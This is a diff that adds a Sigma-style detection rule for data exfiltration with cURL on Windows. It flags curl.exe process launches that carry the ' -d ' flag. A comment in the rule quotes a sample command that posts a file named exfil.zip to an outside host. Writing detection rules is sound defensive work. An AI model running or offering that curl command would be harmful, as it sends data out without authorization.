@@ -1,0 +1,12 @@
+# Image: curl.exe
+# Command Line: curl -d @exfil.zip http://huntmeplz.com:8080/
+
+title: cURL Exfiltration
+description: curl_exfiltration
+detection:
+    selection:
+        EventID: 1
+        Image|endswith : 'curl.exe'
+        CommandLine|contains|all:
+        - ' -d '
+    condition: selection
